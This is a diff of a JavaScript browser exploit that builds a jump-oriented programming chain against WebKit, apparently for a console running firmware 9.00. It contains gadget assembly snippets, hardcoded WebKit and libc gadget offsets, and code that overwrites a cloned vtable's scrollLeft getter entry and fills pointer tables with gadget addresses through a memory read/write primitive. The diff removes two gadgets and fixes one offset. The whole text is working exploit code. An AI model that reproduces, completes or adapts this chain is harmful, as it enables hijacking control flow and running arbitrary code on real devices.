@@ -98,15 +98,6 @@ call qword ptr [rax + 0x28]
 // later. So we pop the return address pushed by jop1.
 //
 // This will make pivoting back easy, just "leave; ret".
-const ta_jop2 = `
-pop rsi
-jmp qword ptr [rax + 0x1c]
-`;
-const ta_jop3 = `
-mov rdi, qword ptr [rax + 8]
-mov rax, qword ptr [rdi]
-jmp qword ptr [rax + 0x30]
-`;
 const jop2 = `
 pop rsi
 jmp qword ptr [rax + 0x1c]
@@ -194,8 +185,6 @@ const webkit_gadget_offsets = new Map(Object.entries({
     [jop6] : 0x000000000004e293,
 
     [ta_jop1] : 0x00000000004e62a4,
-    [ta_jop2] : 0x00000000021fce7e,
-    [ta_jop3] : 0x00000000019becb4,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
@@ -540,8 +529,6 @@ class Chain900 extends Chain900Base {
 
         // 0x1b8 is the offset of the scrollLeft getter native function
         rw.write64(vtable_clone, 0x1b8, this.get_gadget(ta_jop1));
-        rw.write64(vtable_clone, 0xb8, this.get_gadget(ta_jop2));
-        rw.write64(vtable_clone, 0x1c, this.get_gadget(ta_jop3));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
@@ -549,7 +536,7 @@ class Chain900 extends Chain900Base {
         this.rax_ptrs = rax_ptrs;
 
         rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
         rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
         rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
         rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
